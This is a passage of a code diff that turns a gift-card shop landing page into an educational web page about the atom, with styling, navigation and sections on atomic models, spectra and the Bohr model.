@@ -3,497 +3,636 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sainfoxiya Ltd - The Future of Gifting</title>
+    <title>The World of the Atom</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Sora', sans-serif;
-            background-color: #f0f2f5;
-            color: #1a202c;
-            padding-bottom: 80px; /* Add padding to prevent content from being hidden by the policy bar */
+        html {
+            scroll-behavior: smooth;
         }
-
-        /* --- Animated Aurora Background --- */
-        .aurora-bg {
+        body {
+            font-family: 'Inter', sans-serif;
+            color: #E0E0E0;
+            overflow-x: hidden;
+            background-color: #0a0a1a;
+            /* Disable text selection */
+            -webkit-user-select: none; /* Safari */
+            -ms-user-select: none; /* IE 10+ and Edge */
+            user-select: none; /* Standard syntax */
+        }
+        #bg-canvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
-            overflow: hidden;
         }
-
-        .aurora-bg::before, .aurora-bg::after {
-            content: '';
-            position: absolute;
-            width: 100vw;
-            height: 100vh;
-            background-image:
-                radial-gradient(circle at 20% 20%, #89f7fe 0%, transparent 40%),
-                radial-gradient(circle at 80% 70%, #66a6ff 0%, transparent 40%),
-                radial-gradient(circle at 50% 50%, #ffdde1 0%, transparent 30%);
-            mix-blend-mode: screen;
-            filter: blur(80px);
-            animation: moveAurora 20s infinite linear alternate;
+        .content-card {
+            background-color: rgba(10, 10, 26, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            scroll-margin-top: 140px; /* Offset for sticky header */
         }
-
-        .aurora-bg::after {
-            animation-delay: -10s;
+        .content-card h2 {
+            color: #4dd0e1; /* Cyan color for headings */
         }
-
-        @keyframes moveAurora {
-            from { transform: translate(-50%, -50%) rotate(0deg) scale(1.5); }
-            to { transform: translate(0%, 0%) rotate(180deg) scale(1.5); }
+        .content-card h3 {
+            color: #81c784; /* Green color for sub-headings */
         }
-
-        /* --- Glassmorphism Elements --- */
-        .glass-nav, .glass-card, .glass-footer, .glass-policy, .glass-modal {
-            background: rgba(255, 255, 255, 0.7);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            transition: all 0.3s ease;
+        .content-card h4 {
+            color: #fdd835; /* Yellow for sub-sub-headings */
         }
-
-        .glass-card:hover {
-            transform: translateY(-10px);
-            background: rgba(255, 255, 255, 0.8);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        .content-card img {
+            max-height: 450px;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
         }
-
-        .cta-button-v4 {
-            transition: all 0.3s ease;
+        /* Loading Spinner */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4dd0e1;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
         }
-        .cta-button-v4:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-        }
-
-        .section-title-v4 {
-            animation: fadeInUp 1s ease-out;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body class="antialiased">
+<body class="bg-[#0a0a1a]">
 
-    <div class="aurora-bg"></div>
+    <!-- Blocker Overlay for security restrictions -->
+    <div id="blocker-overlay" class="fixed inset-0 bg-black bg-opacity-95 z-50 hidden flex-col items-center justify-center text-center p-8">
+        <div class="bg-gray-900 p-8 rounded-lg shadow-2xl border border-red-500 max-w-lg">
+            <h2 id="blocker-title" class="text-3xl font-bold text-red-400 mb-4"></h2>
+            <p id="blocker-message" class="text-lg text-gray-200"></p>
+        </div>
+    </div>
 
-    <!-- Header -->
-    <header class="glass-nav sticky top-4 mx-auto max-w-7xl rounded-xl z-50 my-4">
-        <nav class="container mx-auto px-6 py-3 flex justify-between items-center">
-            <!-- Logo -->
-            <a href="#" class="text-2xl font-bold text-gray-800 tracking-tight">
-                Sainfoxiya
-            </a>
-            
-            <!-- Desktop Menu & Actions -->
-            <div class="hidden md:flex items-center space-x-6">
-                <a href="#" id="support-link-desktop" class="text-gray-600 hover:text-gray-900 font-medium cursor-pointer">Support</a>
-                <a href="login.html" class="text-gray-600 hover:text-gray-900 font-medium">Login</a>
-                <a href="login.html" class="bg-gray-900 text-white font-semibold py-2 px-5 rounded-lg cta-button-v4">Register</a>
-                <a href="#" title="Your Cart" class="text-gray-700 hover:text-gray-900 text-xl">
-                    <i class="fas fa-shopping-cart"></i>
-                </a>
-            </div>
+    <!-- 3D Background Canvas -->
+    <canvas id="bg-canvas"></canvas>
 
-            <!-- Mobile Menu Button -->
-            <div class="md:hidden">
-                <button id="mobile-menu-button" class="text-gray-800 focus:outline-none">
-                    <i class="fas fa-bars text-2xl"></i>
-                </button>
+    <!-- Main container that will be hidden if restrictions apply -->
+    <div id="main-container">
+        <!-- College Header -->
+        <nav class="bg-black bg-opacity-30 p-4 sticky top-0 z-20 backdrop-filter backdrop-blur-lg border-b border-gray-800">
+            <div class="max-w-7xl mx-auto flex justify-between items-center">
+                <div class="text-white text-xl font-bold">
+                    College of Science
+                </div>
+                <div class="hidden sm:flex space-x-4">
+                    <a href="#" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Home</a>
+                    <a href="#" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Courses</a>
+                    <a href="#" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">About</a>
+                    <a href="#" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Contact</a>
+                </div>
             </div>
         </nav>
-        <!-- Mobile Menu -->
-        <div id="mobile-menu" class="hidden md:hidden px-6 pb-4 space-y-3">
-            <a href="#" id="support-link-mobile" class="block py-2 text-gray-600 hover:text-gray-900 cursor-pointer">Customer Support</a>
-            <a href="#" class="block py-2 text-gray-600 hover:text-gray-900">Cart</a>
-            <hr class="border-gray-300 my-2">
-            <a href="login.html" class="block py-2 text-gray-600 hover:text-gray-900">Login</a>
-            <a href="login.html" class="block mt-2 bg-gray-900 text-white font-semibold py-2 px-4 rounded-lg text-center">Register</a>
-        </div>
-    </header>
 
-    <main class="relative z-10">
-        <!-- Hero Section -->
-        <section class="min-h-[80vh] flex items-center">
-            <div class="container mx-auto px-6 text-center">
-                <h1 class="text-5xl md:text-7xl font-bold leading-tight mb-4 text-gray-800 section-title-v4">
-                    Gifting, Simplified.
-                </h1>
-                <p class="text-lg md:text-xl text-gray-600 max-w-2xl mx-auto mb-10">
-                    The perfect gift is just a click away. Instant, personal, and always appreciated.
-                </p>
-                <a href="#categories" class="bg-gray-900 text-white font-bold py-4 px-10 rounded-xl text-lg cta-button-v4">Find a Card</a>
-            </div>
-        </section>
+        <!-- Main Content -->
+        <div class="relative min-h-screen p-4 sm:p-8">
+            <div class="max-w-7xl mx-auto">
+                
+                <header class="text-center my-12">
+                    <h1 class="text-4xl sm:text-6xl font-bold text-white tracking-tight">The World of the Atom</h1>
+                    <p class="text-lg text-gray-300 mt-4">A comprehensive journey into the fundamental building block of the universe.</p>
+                    <button id="download-btn" class="mt-8 bg-cyan-500 hover:bg-cyan-400 text-black font-bold py-3 px-6 rounded-lg transition-all duration-300 ease-in-out transform hover:scale-105 shadow-lg shadow-cyan-500/20">
+                        Download PDF
+                    </button>
+                </header>
 
-        <!-- How It Works Section -->
-        <section id="how-it-works" class="py-24">
-            <div class="container mx-auto px-6">
-                <div class="text-center mb-16">
-                    <h2 class="text-4xl font-bold text-gray-800 section-title-v4">Three Easy Steps</h2>
-                    <p class="text-gray-500 mt-3 text-lg">From choice to checkout in minutes.</p>
-                </div>
-                <div class="grid md:grid-cols-3 gap-10 max-w-5xl mx-auto">
-                    <!-- Step 1 -->
-                    <div class="glass-card p-8 rounded-2xl text-center">
-                        <div class="w-20 h-20 mx-auto mb-6 flex items-center justify-center rounded-2xl bg-white/50">
-                            <svg class="w-10 h-10 text-gray-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" />
-                            </svg>
-                        </div>
-                        <h3 class="text-xl font-bold mb-2 text-gray-800">1. Choose</h3>
-                        <p class="text-gray-600">Explore hundreds of top brands for any occasion.</p>
-                    </div>
-                    <!-- Step 2 -->
-                    <div class="glass-card p-8 rounded-2xl text-center">
-                        <div class="w-20 h-20 mx-auto mb-6 flex items-center justify-center rounded-2xl bg-white/50">
-                            <svg class="w-10 h-10 text-gray-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M16.862 4.487l1.687-1.688a1.875 1.875 0 112.652 2.652L6.832 19.82a4.5 4.5 0 01-1.897 1.13l-2.685.8.8-2.685a4.5 4.5 0 011.13-1.897L16.863 4.487zm0 0L19.5 7.125" />
-                            </svg>
-                        </div>
-                        <h3 class="text-xl font-bold mb-2 text-gray-800">2. Customize</h3>
-                        <p class="text-gray-600">Add a value, write a message, and make it unique.</p>
-                    </div>
-                    <!-- Step 3 -->
-                    <div class="glass-card p-8 rounded-2xl text-center">
-                        <div class="w-20 h-20 mx-auto mb-6 flex items-center justify-center rounded-2xl bg-white/50">
-                            <svg class="w-10 h-10 text-gray-800" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M6 12L3.269 3.126A59.768 59.768 0 0121.485 12 59.77 59.77 0 013.27 20.876L5.999 12zm0 0h7.5" />
-                            </svg>
-                        </div>
-                        <h3 class="text-xl font-bold mb-2 text-gray-800">3. Send</h3>
-                        <p class="text-gray-600">Deliver instantly via email or schedule for later.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
+                <!-- Page Navigation -->
+                <nav class="sticky top-[72px] bg-[#0a0a1a]/80 backdrop-blur-md z-10 py-4 mb-8 flex flex-wrap justify-center gap-x-3 gap-y-2">
+                    <a href="#introduction" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Introduction</a>
+                    <a href="#structure" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Structure</a>
+                    <a href="#models" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Atomic Models</a>
+                    <a href="#rutherford-experiment" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Rutherford's Exp.</a>
+                    <a href="#atomic-spectra" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Atomic Spectra</a>
+                    <a href="#bohr-model" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Bohr's Model</a>
+                    <a href="#limitations" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Limitations</a>
+                    <a href="#quantum-numbers" class="bg-green-500/10 text-green-300 py-1 px-3 rounded-full hover:bg-green-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Quantum Numbers</a>
+                    <a href="#orbitals" class="bg-green-500/10 text-green-300 py-1 px-3 rounded-full hover:bg-green-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Orbitals</a>
+                    <a href="#wave-particle-duality" class="bg-green-500/10 text-green-300 py-1 px-3 rounded-full hover:bg-green-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Wave-Particle Duality</a>
+                    <a href="#uncertainty-principle" class="bg-green-500/10 text-green-300 py-1 px-3 rounded-full hover:bg-green-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Uncertainty Principle</a>
+                    <a href="#chemical-bonding" class="bg-yellow-500/10 text-yellow-300 py-1 px-3 rounded-full hover:bg-yellow-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Chemical Bonding</a>
+                    <a href="#radioactivity" class="bg-yellow-500/10 text-yellow-300 py-1 px-3 rounded-full hover:bg-yellow-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Radioactivity</a>
+                    <a href="#fission" class="bg-yellow-500/10 text-yellow-300 py-1 px-3 rounded-full hover:bg-yellow-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Fission</a>
+                    <a href="#fusion" class="bg-yellow-500/10 text-yellow-300 py-1 px-3 rounded-full hover:bg-yellow-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Fusion</a>
+                    <a href="#half-life" class="bg-yellow-500/10 text-yellow-300 py-1 px-3 rounded-full hover:bg-yellow-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Half-Life</a>
+                    <a href="#fundamental-forces" class="bg-red-500/10 text-red-300 py-1 px-3 rounded-full hover:bg-red-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Fundamental Forces</a>
+                    <a href="#standard-model" class="bg-red-500/10 text-red-300 py-1 px-3 rounded-full hover:bg-red-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Standard Model</a>
+                    <a href="#antimatter" class="bg-red-500/10 text-red-300 py-1 px-3 rounded-full hover:bg-red-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Antimatter</a>
+                    <a href="#quantum-tunneling" class="bg-purple-500/10 text-purple-300 py-1 px-3 rounded-full hover:bg-purple-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Quantum Tunneling</a>
+                    <a href="#entanglement" class="bg-purple-500/10 text-purple-300 py-1 px-3 rounded-full hover:bg-purple-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Entanglement</a>
+                    <a href="#superposition" class="bg-purple-500/10 text-purple-300 py-1 px-3 rounded-full hover:bg-purple-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Superposition</a>
+                     <a href="#atomic-clocks" class="bg-indigo-500/10 text-indigo-300 py-1 px-3 rounded-full hover:bg-indigo-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Atomic Clocks</a>
+                    <a href="#spectroscopy" class="bg-indigo-500/10 text-indigo-300 py-1 px-3 rounded-full hover:bg-indigo-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Spectroscopy</a>
+                    <a href="#particle-accelerators" class="bg-indigo-500/10 text-indigo-300 py-1 px-3 rounded-full hover:bg-indigo-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Accelerators</a>
+                     <a href="#applications" class="bg-cyan-500/10 text-cyan-300 py-1 px-3 rounded-full hover:bg-cyan-500/30 transition-colors duration-300 ease-in-out text-xs sm:text-sm">Applications</a>
+                </nav>
 
-        <!-- Categories Section -->
-        <section id="categories" class="py-24">
-            <div class="container mx-auto px-6">
-                <div class="text-center mb-16">
-                    <h2 class="text-4xl font-bold text-gray-800 section-title-v4">For Every Occasion</h2>
-                    <p class="text-gray-500 mt-3 text-lg">Whatever you're celebrating, there's a card for it.</p>
-                </div>
-                <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
-                    <!-- Category Card -->
-                    <a href="#" class="glass-card p-6 rounded-2xl flex flex-col items-center justify-center text-center h-40">
-                        <i class="fas fa-utensils text-3xl mb-3 text-gray-700"></i>
-                        <h3 class="font-semibold text-gray-800">Dining</h3>
-                    </a>
-                    <a href="#" class="glass-card p-6 rounded-2xl flex flex-col items-center justify-center text-center h-40">
-                        <i class="fas fa-shopping-bag text-3xl mb-3 text-gray-700"></i>
-                        <h3 class="font-semibold text-gray-800">Retail</h3>
-                    </a>
-                    <a href="#" class="glass-card p-6 rounded-2xl flex flex-col items-center justify-center text-center h-40">
-                        <i class="fas fa-film text-3xl mb-3 text-gray-700"></i>
-                        <h3 class="font-semibold text-gray-800">Entertainment</h3>
-                    </a>
-                    <a href="#" class="glass-card p-6 rounded-2xl flex flex-col items-center justify-center text-center h-40">
-                        <i class="fas fa-heart text-3xl mb-3 text-gray-700"></i>
-                        <h3 class="font-semibold text-gray-800">Wellness</h3>
-                    </a>
-                </div>
-            </div>
-        </section>
+                <main class="space-y-16">
 
-        <!-- Why Choose Us Section -->
-        <section id="features" class="py-24">
-            <div class="container mx-auto px-6">
-                <div class="max-w-4xl mx-auto glass-card rounded-2xl p-10 md:p-16">
-                    <div class="grid md:grid-cols-2 gap-10 items-center">
-                        <div class="text-center md:text-left">
-                            <h2 class="text-3xl font-bold text-gray-800 mb-4">Why Choose Sainfoxiya?</h2>
-                            <p class="text-gray-600">We provide a secure, flexible, and lightning-fast gifting experience you can trust.</p>
-                        </div>
-                        <div class="grid grid-cols-2 gap-6 text-center">
-                            <div class="bg-white/50 p-4 rounded-xl">
-                                <i class="fas fa-bolt text-2xl text-gray-800 mb-2"></i>
-                                <p class="font-semibold">Instant</p>
+                    <!-- Content Sections -->
+                    <section id="introduction" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">What is an Atom?</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            An atom is the smallest unit of ordinary matter that forms a chemical element. Every solid, liquid, gas, and plasma is composed of neutral or ionized atoms. The concept of the atom as an indivisible component of matter was first proposed by ancient Greek philosophers. However, it was the scientific discoveries of the 19th and 20th centuries that confirmed its existence and revealed its intricate internal structure. J.J. Thomson's 1897 discovery of the electron proved that atoms were not indivisible, but were instead composed of smaller subatomic particles.
+                        </p>
+                        <p class="text-lg leading-relaxed">
+                            Atoms are incredibly small, typically around 100 picometers (a ten-billionth of a meter) across. Their minuscule scale means their behavior is governed not by classical physics, but by the fascinating rules of quantum mechanics. Understanding the atom is key to understanding chemistry, materials science, and the very nature of the universe.
+                        </p>
+                    </section>
+                    
+                    <section id="structure" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-6">The Detailed Structure of an Atom</h2>
+                        <div class="space-y-8">
+                            <div>
+                                <h3 class="text-2xl font-semibold mb-3">The Nucleus: The Dense Core</h3>
+                                <p class="leading-relaxed">At the heart of the atom is the nucleus, a tiny, dense, positively charged core. It contains over 99.94% of the atom's mass but occupies a minuscule fraction of its volume. The particles within the nucleus, protons and neutrons, are held together by the <strong class="text-yellow-300">strong nuclear force</strong>, the most powerful of the four fundamental forces of nature.</p>
                             </div>
-                            <div class="bg-white/50 p-4 rounded-xl">
-                                <i class="fas fa-shield-alt text-2xl text-gray-800 mb-2"></i>
-                                <p class="font-semibold">Secure</p>
+                            <div class="grid md:grid-cols-2 gap-8 text-left">
+                                <div class="bg-slate-800/50 p-6 rounded-xl border border-gray-700">
+                                    <h4 class="text-xl font-bold">Protons (p+)</h4>
+                                    <p class="mt-2">Positively charged particles that determine the atom's identity. The number of protons is the <span class="text-yellow-300 font-semibold">atomic number (Z)</span>, uniquely defining an element.</p>
+                                </div>
+                                <div class="bg-slate-800/50 p-6 rounded-xl border border-gray-700">
+                                    <h4 class="text-xl font-bold">Neutrons (n⁰)</h4>
+                                    <p class="mt-2">Neutral particles that add mass and are crucial for nuclear stability, preventing proton-proton repulsion from tearing the nucleus apart. Atoms of the same element with different numbers of neutrons are called isotopes.</p>
+                                </div>
                             </div>
-                            <div class="bg-white/50 p-4 rounded-xl">
-                                <i class="fas fa-layer-group text-2xl text-gray-800 mb-2"></i>
-                                <p class="font-semibold">Flexible</p>
-                            </div>
-                            <div class="bg-white/50 p-4 rounded-xl">
-                                <i class="fas fa-headset text-2xl text-gray-800 mb-2"></i>
-                                <p class="font-semibold">Support</p>
+                            <div>
+                                <h3 class="text-2xl font-semibold mb-3">The Electron Cloud: A Realm of Probability</h3>
+                                <p class="leading-relaxed mb-4">Surrounding the nucleus is a vast region of space occupied by negatively charged electrons. These electrons exist in a "cloud" of probability, described by regions called orbitals. The arrangement of electrons determines the atom's chemical properties and its ability to bond with other atoms.</p>
                             </div>
                         </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+                    </section>
+                    
+                    <section id="models" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Early Models of the Atom</h2>
+                        <div class="space-y-10">
+                            <div>
+                                <h3 class="text-2xl font-semibold">1. Dalton's Model (1803) - The Billiard Ball</h3>
+                                <p class="mt-2 text-gray-300">John Dalton proposed that atoms were indivisible, indestructible spheres, like billiard balls. He correctly theorized that each element consists of a unique type of atom and that chemical reactions involve the rearrangement of these atoms.</p>
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-semibold">2. Thomson's Model (1898) - The Plum Pudding</h3>
+                                <p class="mt-2 text-gray-300">After discovering the electron, J.J. Thomson proposed the "Plum Pudding Model." He envisioned the atom as a sphere of uniformly distributed positive charge with negatively charged electrons embedded within it, much like plums in a pudding. This was the first model to suggest that atoms were divisible.</p>
+                            </div>
+                        </div>
+                    </section>
+                    
+                    <section id="rutherford-experiment" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Rutherford's Nuclear Model</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            In 1911, Ernest Rutherford's team conducted the groundbreaking gold foil experiment, which completely changed the understanding of atomic structure. This experiment, performed by Hans Geiger and Ernest Marsden, led to the discovery of the atomic nucleus.
+                        </p>
+                        <h3 class="text-2xl font-semibold mb-3">The Gold Foil Experiment</h3>
+                        <p class="leading-relaxed mb-4">
+                            A narrow beam of high-energy, positively charged alpha particles was fired at an extremely thin sheet of gold foil. A fluorescent screen was placed around the foil to detect the alpha particles by observing the tiny flashes of light (scintillations) they produced upon impact.
+                        </p>
+                        <h3 class="text-2xl font-semibold mb-3">Surprising Observations and Conclusions</h3>
+                        <div class="space-y-4">
+                            <p><strong class="text-green-400">1. Most particles passed straight through:</strong> This indicated that most of the atom is empty space.</p>
+                            <p><strong class="text-green-400">2. Some particles were deflected at small angles:</strong> This suggested they were repelled by a concentrated positive charge within the atom.</p>
+                            <p><strong class="text-green-400">3. A very small number (about 1 in 8000) were deflected by large angles, some even bouncing straight back:</strong> This astonishing result could only be explained if the atom's positive charge and most of its mass were concentrated in a tiny, dense core—the nucleus.</p>
+                        </div>
+                        <p class="mt-6 leading-relaxed">
+                            Based on these findings, Rutherford proposed his planetary model: a small, dense, positive nucleus at the center, with electrons orbiting it like planets around the sun. This model correctly placed the mass and positive charge but had a critical flaw: according to classical physics, an orbiting electron should continuously lose energy as radiation, spiral inward, and cause the atom to collapse. It also couldn't explain the discrete line spectra emitted by atoms.
+                        </p>
+                    </section>
 
-    </main>
+                    <section id="atomic-spectra" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Atomic Spectra: The Fingerprints of Elements</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            When a gas is heated or subjected to an electric current, it emits light. When this light is passed through a prism, it doesn't form a continuous rainbow. Instead, it produces a series of distinct bright lines of specific colors (or wavelengths). This is called an <strong class="text-yellow-300">emission line spectrum</strong>.
+                        </p>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Conversely, when white light passes through a cool gas, the gas absorbs the exact same specific wavelengths, resulting in dark lines in the continuous spectrum. This is called an <strong class="text-yellow-300">absorption spectrum</strong>. Each element has a unique, characteristic spectrum, which acts as a "fingerprint" allowing scientists to identify elements across the universe. The Rutherford model could not explain why these spectra consisted of discrete lines rather than a continuous smear of colors.
+                        </p>
+                    </section>
 
-    <!-- Footer -->
-    <footer id="contact" class="relative z-10 glass-footer mt-24">
-        <div class="container mx-auto px-6 py-16">
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 text-gray-800">
-                <!-- Column 1: Company -->
-                <div>
-                    <h3 class="font-bold text-lg mb-4">Sainfoxiya</h3>
-                    <p class="text-gray-600 text-sm">The Future of Gifting.</p>
-                </div>
-                <!-- Column 2: Legal -->
-                <div>
-                    <h3 class="font-semibold mb-4">Legal</h3>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" id="privacy-policy-link" class="text-gray-600 hover:text-gray-900 cursor-pointer">Privacy Policy</a></li>
-                        <li><a href="#" id="terms-link" class="text-gray-600 hover:text-gray-900 cursor-pointer">Terms & Conditions</a></li>
-                        <li><a href="#" id="refund-link" class="text-gray-600 hover:text-gray-900 cursor-pointer">Refund & Exchange</a></li>
-                    </ul>
-                </div>
-                <!-- Column 3: Help -->
-                <div>
-                    <h3 class="font-semibold mb-4">Help</h3>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" id="contact-us-link" class="text-gray-600 hover:text-gray-900 cursor-pointer">Contact Us</a></li>
-                        <li><a href="#" class="text-gray-600 hover:text-gray-900">Payment Methods</a></li>
-                        <li><a href="#" id="support-link-footer" class="text-gray-600 hover:text-gray-900 cursor-pointer">Support</a></li>
-                    </ul>
-                </div>
-                 <!-- Column 4: Payment Methods -->
-                <div>
-                    <h3 class="font-semibold mb-4">We Accept</h3>
-                    <p class="text-gray-600 text-sm">Payment methods are currently unavailable.</p>
-                </div>
-            </div>
-            <div class="border-t border-gray-300/50 mt-12 pt-8 text-center">
-                <p class="text-gray-500 text-sm">&copy; 2024 Sainfoxiya Ltd. All Rights Reserved.</p>
-            </div>
-        </div>
-    </footer>
+                    <section id="bohr-model" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">The Bohr Model of the Hydrogen Atom (1913)</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            To resolve the problems with Rutherford's model and explain atomic spectra, Niels Bohr incorporated ideas from the emerging field of quantum mechanics. He proposed a new model for the hydrogen atom based on three revolutionary postulates:
+                        </p>
+                        <div class="space-y-6 bg-slate-800/50 p-6 rounded-xl border border-gray-700">
+                            <p><strong class="text-green-400">Postulate 1 (Stable Orbits):</strong> An electron can revolve around the nucleus in certain specific circular orbits, called stationary states, without emitting any radiation. Each of these orbits has a definite, fixed energy.</p>
+                            <p><strong class="text-green-400">Postulate 2 (Quantization of Angular Momentum):</strong> The electron can only exist in orbits for which its angular momentum is an integral multiple of h/2π (where h is Planck's constant). This condition quantizes the allowable radii and energies of the electron orbits.</p>
+                            <p><strong class="text-green-400">Postulate 3 (Energy Transitions):</strong> An electron can "jump" from a higher energy orbit to a lower one by emitting a photon of light. The energy of this photon is exactly equal to the energy difference between the two orbits. This explains why atoms emit light at specific frequencies, creating line spectra.</p>
+                        </div>
+                        <p class="mt-6 leading-relaxed">
+                            Bohr's model was a phenomenal success for the hydrogen atom. It correctly predicted the wavelengths of its spectral lines and explained why atoms were stable. The lowest energy state (n=1) is called the <strong class="text-yellow-300">ground state</strong>. Higher energy states (n=2, 3, 4...) are called <strong class="text-yellow-300">excited states</strong>. An energy of 13.6 eV is required to completely remove the electron from a hydrogen atom in its ground state, a value known as its ionization energy, which perfectly matched experimental results.
+                        </p>
+                    </section>
 
-    <!-- Policy Acceptance Bar -->
-    <div id="policy-bar" class="fixed bottom-0 left-0 w-full z-50 p-4 transition-transform duration-500 transform translate-y-0">
-        <div class="glass-policy rounded-xl max-w-4xl mx-auto flex items-center justify-between p-3 shadow-lg">
-            <p class="text-sm text-gray-700 mr-4">
-                By using our site, you agree to our <a href="#" class="font-semibold underline hover:text-gray-900">Terms & Policies</a>.
-            </p>
-            <button id="accept-policy-button" class="text-gray-600 hover:text-black text-lg flex-shrink-0">
-                <i class="fas fa-times"></i>
-            </button>
+                    <section id="limitations" class="content-card p-6 md:p-8 rounded-2xl shadow-lg">
+                        <h2 class="text-3xl font-bold mb-4">Limitations and the Path to Quantum Mechanics</h2>
+                        <p class="text-lg leading-relaxed mb-4">
+                            Despite its triumphs, the Bohr model was not perfect and had significant limitations:
+                        </p>
+                        <ul class="list-disc list-inside space-y-3">
+                            <li>It worked perfectly only for hydrogen and hydrogen-like atoms (with a single electron, like He⁺ or Li²⁺). It failed to predict the spectra of multi-electron atoms.</li>
+                            <li>It could not explain the relative intensities of spectral lines (why some lines are brighter than others).</li>
